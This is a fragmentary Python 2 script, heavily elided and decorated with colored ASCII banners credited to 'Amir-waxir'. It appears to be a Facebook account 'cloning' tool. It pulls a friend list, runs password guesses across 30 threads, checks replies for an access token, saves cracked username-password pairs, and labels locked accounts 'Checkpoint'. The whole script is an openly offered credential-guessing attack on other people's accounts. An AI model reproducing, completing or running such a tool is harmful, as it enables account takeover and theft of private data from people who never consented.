...
░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝
 ...
 ♨️°───────Amir-waxir)───────°♨️ 
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
\033[1;96m║✯ Creator ✯Amir-waxir      ║    
\033[1;98m║✯ Channel Asim Pardasi         ║  
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Amir-waxir
	    time.sleep(2)
            loop = 'false'
        else:
...
def super():
	...
	os.system('clear')
	print logo
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;96m>_<Clone Friend List."
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;91mAmir-waxir\033[1;97m═══•◈•"
		...
		print "\033[1;95m•◈•══════•◈\033[1;91mAmirwaxir\033[1;95m◈•══════•◈•"
		try:
	...
	jalan('          \033[1;91mAmir-waxir start cloning Wait...')
	print  "  \033[1;92m ◄══════════════════Amir-Kink══════════════════►" 
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92mAmir-Hack100%'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mAmir-Checkpoint'
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬•◈\033[1;91mAmir-waxir\033[1;95m◈•▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By M-Asim-CH--•◈•---»" #Dev:Amir-waxir
...
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ..Amir waxir Creations.. \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Instagram
              \033[1;91Amir waxir"""
